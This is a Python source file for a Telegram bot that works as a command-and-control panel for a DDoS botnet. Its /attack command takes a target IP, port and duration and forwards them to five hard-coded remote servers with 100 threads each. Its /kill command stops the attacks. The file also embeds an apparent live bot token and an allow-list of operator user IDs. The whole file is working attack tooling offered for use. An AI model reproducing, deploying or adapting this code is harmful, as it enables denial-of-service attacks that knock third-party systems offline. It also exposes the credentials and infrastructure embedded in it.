from telegram.ext import Updater, CommandHandler
import requests
import threading

# Danh sách các ID người dùng được phép sử dụng lệnh /attack
allowed_user_ids = {5561757248, 5519895288}

def start(update, context):
    update.message.reply_text("Hello User, Use /attack to send attack")

def send_request(url):
    requests.get(url)

def kill(update, context):
    user_id = update.message.from_user.id
    if user_id not in allowed_user_ids:
        update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
        return

    url1 = f"http://152.42.211.83/?action=kill"
    url2 = f"http://152.42.202.243/?action=kill"
    url3 = f"http://128.199.84.155/?action=kill"
    url4 = f"http://128.199.112.20/?action=kill"
    url5 = f"http://152.42.165.62/?action=kill"

    thread1 = threading.Thread(target=send_request, args=(url1,))
    thread2 = threading.Thread(target=send_request, args=(url2,))
    thread3 = threading.Thread(target=send_request, args=(url3,))
    thread4 = threading.Thread(target=send_request, args=(url4,))
    thread5 = threading.Thread(target=send_request, args=(url5,))
    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()

    print(f"Kill All DDoS Process")
    update.message.reply_text(f"Kill All DDoS Process Success")

def attack(update, context):
    user_id = update.message.from_user.id
    if user_id not in allowed_user_ids:
        update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
        return

    args = context.args
    if len(args) != 3:
        update.message.reply_text("Usage: /attack ip port time")
        return

    ip, port, time = args

    url1 = f"http://152.42.211.83/?ip={ip}&port={port}&thread=100&time={time}"
    url2 = f"http://152.42.202.243/?ip={ip}&port={port}&thread=100&time={time}"
    url3 = f"http://128.199.84.155/?ip={ip}&port={port}&thread=100&time={time}"
    url4 = f"http://128.199.112.20/?ip={ip}&port={port}&thread=100&time={time}"
    url5 = f"http://152.42.165.62/?ip={ip}&port={port}&thread=100&time={time}"

    thread1 = threading.Thread(target=send_request, args=(url1,))
    thread2 = threading.Thread(target=send_request, args=(url2,))
    thread3 = threading.Thread(target=send_request, args=(url3,))
    thread4 = threading.Thread(target=send_request, args=(url4,))
    thread5 = threading.Thread(target=send_request, args=(url5,))
    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()

    print(f"Attack {ip}:{port} in {time} second")
    update.message.reply_text(f"DDoS Attack Sent Success To {ip}:{port} in {time} second")

def main():
    updater = Updater("5759600803:AAHbKQtzJznXGbvhuu7oU46bT31XohtIgz4", use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("attack", attack))
    dp.add_handler(CommandHandler("kill", kill))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
